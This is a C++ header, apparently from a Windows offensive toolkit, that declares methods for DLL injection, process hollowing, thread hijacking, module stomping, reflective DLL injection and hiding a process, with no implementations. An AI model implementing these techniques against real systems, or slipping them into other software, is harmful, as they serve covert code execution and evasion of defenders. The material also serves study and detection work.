#ifndef PROCESS_INJECTION_H
#define PROCESS_INJECTION_H

#include <Windows.h>
#include <TlHelp32.h>

class ProcessInjection {
public:
    static DWORD FindProcessByName(const char* processName);
    static bool InjectIntoProcess(DWORD processId, const char* dllPath);
    static bool HollowProcess(const char* targetProcess, const char* payloadPath);
    static bool HijackThread(DWORD processId);
    static bool ModuleStomping(const char* targetDll, const char* newDllPath);
    static bool ReflectiveDLLInjection(DWORD processId, const unsigned char* dllData, size_t size);
    static void HideProcess(DWORD processId);
    
private:
    static bool WriteMemory(HANDLE hProcess, LPVOID address, LPCVOID buffer, SIZE_T size);
    static HANDLE CreateSuspendedProcess(const char* executablePath, LPSTARTUPINFOA si, LPPROCESS_INFORMATION pi);
};

#endif
